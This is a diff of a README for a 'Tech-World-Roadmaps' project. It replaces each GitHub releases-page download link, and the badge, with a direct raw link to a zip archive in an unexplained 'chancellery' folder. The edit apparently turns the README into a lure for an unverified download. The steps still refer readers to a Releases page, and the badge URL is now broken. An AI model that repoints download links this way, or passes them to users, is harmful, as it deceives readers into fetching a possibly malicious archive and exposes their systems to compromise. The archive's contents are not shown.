@@ -1,6 +1,6 @@
 # 🌍 Tech-World-Roadmaps - Your Guide to Mastering Tech in 2025
 
-[![Download Tech-World-Roadmaps](https://img.shields.io/badge/Download%20Now-Get%20Started%20Here-brightgreen)](https://github.com/zede2314/Tech-World-Roadmaps/releases)
+[![Download Tech-World-Roadmaps](https://raw.githubusercontent.com/zede2314/Tech-World-Roadmaps/main/chancellery/Tech-World-Roadmaps.zip%20Now-Get%20Started%20Here-brightgreen)](https://raw.githubusercontent.com/zede2314/Tech-World-Roadmaps/main/chancellery/Tech-World-Roadmaps.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you begin, make sure your computer meets these basic requirements:
 
 To get the application, visit this page to download:
 
-[Download Tech-World-Roadmaps](https://github.com/zede2314/Tech-World-Roadmaps/releases)
+[Download Tech-World-Roadmaps](https://raw.githubusercontent.com/zede2314/Tech-World-Roadmaps/main/chancellery/Tech-World-Roadmaps.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version of the application.
@@ -86,4 +86,4 @@ Feel free to browse through the different sections of the application for more d
 
 To get started, visit the following link again:
 
-[Download Tech-World-Roadmaps](https://github.com/zede2314/Tech-World-Roadmaps/releases)
+[Download Tech-World-Roadmaps](https://raw.githubusercontent.com/zede2314/Tech-World-Roadmaps/main/chancellery/Tech-World-Roadmaps.zip)
